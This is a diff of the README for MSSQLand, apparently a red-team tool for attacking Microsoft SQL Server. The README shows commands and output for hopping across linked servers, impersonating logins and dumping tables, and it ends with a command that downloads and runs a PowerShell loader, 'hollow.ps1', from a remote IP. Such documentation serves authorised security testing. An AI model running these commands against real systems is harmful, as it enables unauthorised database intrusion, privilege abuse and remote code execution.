@@ -7,18 +7,23 @@ Land gracefully in your target MSSQL DBMS, as if arriving on a business-class fl
 
 MSSQLand is your ultimate tool for interacting with [Microsoft SQL Server (MSSQL)](https://en.wikipedia.org/wiki/Microsoft_SQL_Server) database management system (DBMS) in your red activities. It allows you to pave your way across multiple linked servers and impersonate anyone (authorised) on the road, popping out of the last hop with any desired action.
 
-The tool's precise and structured output is surrounded by timestamps and enriched with useful information, making it perfect for capturing beautiful screenshots in your reports.
-
-For example, running this command:
+The tool's precise and structured output, enriched with timestamps and valuable contextual information, is designed to produce visually appealing and professional results, making it ideal for capturing high-quality screenshots for your reports. For example, running this command:
 ```shell
-MSSQLand.exe /t:SQL01:Moulinier /u:Jacquard /p:Fr@nce!1940%Tr1c /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:tables balard
+MSSQLand.exe /h:SQL01:Moulinier /u:Jacquard /p:Fr@nce!1940%Tr1c /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:tables balard
 ```
 
 Create the following output:
 ```txt
-====================================
-  Start at 2025-01-15 21:53:53 UTC
-====================================
+===========================================
+            Executing on: SQL01
+    Time Zone ID: Romance Standard Time
+  Local Time: 13:42:48, UTC Offset: 01:00
+===========================================
+
+===========================================
+  Start at 2025-01-17 12:42:48:53388 UTC
+===========================================
+
 [>] Trying to connect with LocalCredentials
 [+] Connection opened successfully
 |-> Workstation ID: SQL01
@@ -45,10 +50,11 @@ Create the following output:
 | 7  | Calot | password04/06/1958 |
 
 [+] Search completed.
-====================================
-  End at 2025-01-15 21:53:53 UTC
-  Total duration: 0.11 seconds
-====================================
+
+===========================================
+   End at 2025-01-17 12:42:48:66109 UTC
+       Total duration: 0.13 seconds
+===========================================
 ```
 
 And yes, all the output tables are Markdown-friendly and can be directly copied and pasted into your notes. Below is an example of `/a:tables` output:
@@ -82,14 +88,11 @@ EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04'
 No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:
 
 ```shell
-MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
+MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
 ```
 
 The output is as follows:
 ```txt
-====================================
-  Start at 2025-01-14 21:31:39 UTC
-====================================
 [>] Trying to connect with TokenCredentials
 [+] Connection opened successfully
 |-> Workstation ID: SQL01
@@ -99,8 +102,8 @@ The output is as follows:
 [i] Logged in as NT AUTHORITY\SYSTEM
 |-> Mapped to the user dbo
 [i] You can impersonate anyone as a sysadmin
-[+] Successfully impersonated user: webapp01
-[i] Logged in as webapp01
+[+] Successfully impersonated user: webapp02
+[i] Logged in as webapp02
 |-> Mapped to the user dbo
 [i] Execution chain: localhost -> SQL02 -> SQL03 -> SQL04
 [i] Logged in as webapp05
@@ -111,23 +114,15 @@ The output is as follows:
 | Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |
 | -------------------- | ----- | ---------- | -------- | ----------- | ----------- | ------------ | ------- | --------- | --------- |
 | 7/7/2020 1:02:17 PM  | SQL05 | SQL Server | SQLNCLI  | SQL05       | webapp05    | webapps      | True    | True      | False     |
-
-====================================
-  End at 2025-01-14 21:31:39 UTC
-  Total duration: 0.08 seconds
-====================================
 ```
 
 Now you want to verify who you can impersonate at the end of the chain:
 ```shell
-MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
+MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
 ```
 The output shows:
 
 ```txt
-====================================
-  Start at 2025-01-14 21:35:22 UTC
-====================================
 [>] Trying to connect with TokenCredentials
 [+] Connection opened successfully
 |-> Workstation ID: SQL01
@@ -150,16 +145,11 @@ The output shows:
 | Jacquard    | Yes           |
 | Calot       | No            |
 | Moulinier   | No            |
-
-====================================
-  End at 2025-01-14 21:35:22  UTC
-  Total duration: 0.10 seconds
-====================================
 ```
 
 Great! Now you can directly reach out to your loader with:
 ```shell
-MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
+MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
 
 Or even use Common Language Runtime (CLR) to load remotely a library with:
